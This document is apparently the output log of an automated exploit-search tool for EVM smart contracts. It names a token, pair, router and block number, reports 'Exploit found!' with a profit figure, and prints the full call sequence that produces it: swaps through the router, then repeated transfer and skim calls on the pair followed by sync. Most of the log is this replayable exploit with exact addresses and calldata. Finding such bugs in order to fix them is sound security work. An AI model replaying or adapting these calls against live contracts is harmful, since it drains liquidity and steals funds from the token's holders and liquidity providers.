target_token: 0x449fea37d339a11efe1b181e5d5462464bba3752
base_token: 0x55d398326f99059ff775485246999027b3197955
pair: 0x8f4ba1832611f0c364de7114bbff92ba676adf0e
{"bridge": 0x96915333e1aaa42dde389fd7a930b7700235da82, "init": 0x00a329c0648769a73afac7f9381e08fb43dbea72, "main_pier": 0xf13d706f4730e9473ac741a5faded990f87da743, "oracle": 0x502be16aa82bad01fdc3feb3c5f8c431f8eeb8ae}
Block number: 24655771
Found 96 templates breaking invariant!
After introducing state-changing calls, found 752 templates breaking invariant!
loop_num: 2
Oracle
bug: PairTokenLoss
loop_num: 3
Oracle
bug: ProfitGenerated, profit: 46231826728699088537
Exploit found!
profit: 46231826728699088537

Staring with 1 of pair balance
RawTestCase { initial_eth_amount: 1152921504606846976, prefix_swaps: [EVMCall { to: 0x10ed43c718714eb63d5aa57b78b54704e256024e, value: 0, name: "swapExactTokensForTokensSupportingFeeOnTransferTokens", calldata: [92, 17, 215, 149, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 160, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 241, 61, 112, 111, 71, 48, 233, 71, 58, 199, 65, 165, 250, 222, 217, 144, 248, 125, 167, 67, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 85, 211, 152, 50, 111, 153, 5, 159, 247, 117, 72, 82, 70, 153, 144, 39, 179, 25, 121, 85, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 159, 234, 55, 211, 57, 161, 30, 254, 27, 24, 30, 93, 84, 98, 70, 75, 186, 55, 82], args: [Uint(1152921504606846976), Uint(1), Array([Address(0x55d398326f99059ff775485246999027b3197955), Address(0x449fea37d339a11efe1b181e5d5462464bba3752)]), Address(0xf13d706f4730e9473ac741a5faded990f87da743), Uint(115792089237316195423570985008687907853269984665640564039457584007913129639935)] }], suffix_swaps: [EVMCall { to: 0x10ed43c718714eb63d5aa57b78b54704e256024e, value: 0, name: "swapExactTokensForTokensSupportingFeeOnTransferTokens", calldata: [92, 17, 215, 149, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 160, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 241, 61, 112, 111, 71, 48, 233, 71, 58, 199, 65, 165, 250, 222, 217, 144, 248, 125, 167, 67, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 159, 234, 55, 211, 57, 161, 30, 254, 27, 24, 30, 93, 84, 98, 70, 75, 186, 55, 82, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 85, 211, 152, 50, 111, 153, 5, 159, 247, 117, 72, 82, 70, 153, 144, 39, 179, 25, 121, 85], args: [Uint(1152921504606846976), Uint(1), Array([Address(0x449fea37d339a11efe1b181e5d5462464bba3752), Address(0x55d398326f99059ff775485246999027b3197955)]), Address(0xf13d706f4730e9473ac741a5faded990f87da743), Uint(115792089237316195423570985008687907853269984665640564039457584007913129639935)] }], mutable_calls: [EVMCall { to: 0x449fea37d339a11efe1b181e5d5462464bba3752, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 143, 75, 161, 131, 38, 17, 240, 195, 100, 222, 113, 20, 187, 255, 146, 186, 103, 106, 223, 14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0], args: [Address(0x8f4ba1832611f0c364de7114bbff92ba676adf0e), Uint(1152921504606846976)] }, EVMCall { to: 0x96915333e1aaa42dde389fd7a930b7700235da82, value: 0, name: "saveBalanceSnapshot", calldata: [13, 24, 189, 25], args: [] }, EVMCall { to: 0x8f4ba1832611f0c364de7114bbff92ba676adf0e, value: 0, name: "skim", calldata: [188, 37, 207, 119, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 143, 75, 161, 131, 38, 17, 240, 195, 100, 222, 113, 20, 187, 255, 146, 186, 103, 106, 223, 14], args: [Address(0x8f4ba1832611f0c364de7114bbff92ba676adf0e)] }, EVMCall { to: 0x449fea37d339a11efe1b181e5d5462464bba3752, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 241, 61, 112, 111, 71, 48, 233, 71, 58, 199, 65, 165, 250, 222, 217, 144, 248, 125, 167, 67, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], args: [Address(0xf13d706f4730e9473ac741a5faded990f87da743), Uint(0)] }, EVMCall { to: 0x8f4ba1832611f0c364de7114bbff92ba676adf0e, value: 0, name: "skim", calldata: [188, 37, 207, 119, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 143, 75, 161, 131, 38, 17, 240, 195, 100, 222, 113, 20, 187, 255, 146, 186, 103, 106, 223, 14], args: [Address(0x8f4ba1832611f0c364de7114bbff92ba676adf0e)] }, EVMCall { to: 0x449fea37d339a11efe1b181e5d5462464bba3752, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 241, 61, 112, 111, 71, 48, 233, 71, 58, 199, 65, 165, 250, 222, 217, 144, 248, 125, 167, 67, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], args: [Address(0xf13d706f4730e9473ac741a5faded990f87da743), Uint(0)] }, EVMCall { to: 0x8f4ba1832611f0c364de7114bbff92ba676adf0e, value: 0, name: "skim", calldata: [188, 37, 207, 119, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 143, 75, 161, 131, 38, 17, 240, 195, 100, 222, 113, 20, 187, 255, 146, 186, 103, 106, 223, 14], args: [Address(0x8f4ba1832611f0c364de7114bbff92ba676adf0e)] }, EVMCall { to: 0x449fea37d339a11efe1b181e5d5462464bba3752, value: 0, name: "transfer", calldata: [169, 5, 156, 187, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 241, 61, 112, 111, 71, 48, 233, 71, 58, 199, 65, 165, 250, 222, 217, 144, 248, 125, 167, 67, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], args: [Address(0xf13d706f4730e9473ac741a5faded990f87da743), Uint(0)] }, EVMCall { to: 0x8f4ba1832611f0c364de7114bbff92ba676adf0e, value: 0, name: "skim", calldata: [188, 37, 207, 119, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 241, 61, 112, 111, 71, 48, 233, 71, 58, 199, 65, 165, 250, 222, 217, 144, 248, 125, 167, 67], args: [Address(0xf13d706f4730e9473ac741a5faded990f87da743)] }, EVMCall { to: 0x8f4ba1832611f0c364de7114bbff92ba676adf0e, value: 0, name: "sync", calldata: [255, 246, 202, 233], args: [] }, EVMCall { to: 0x96915333e1aaa42dde389fd7a930b7700235da82, value: 0, name: "checkInvariantBroken", calldata: [249, 244, 235, 110], args: [] }] }
time elapsed: Duration { secs: 38, nanos: 410752380 }
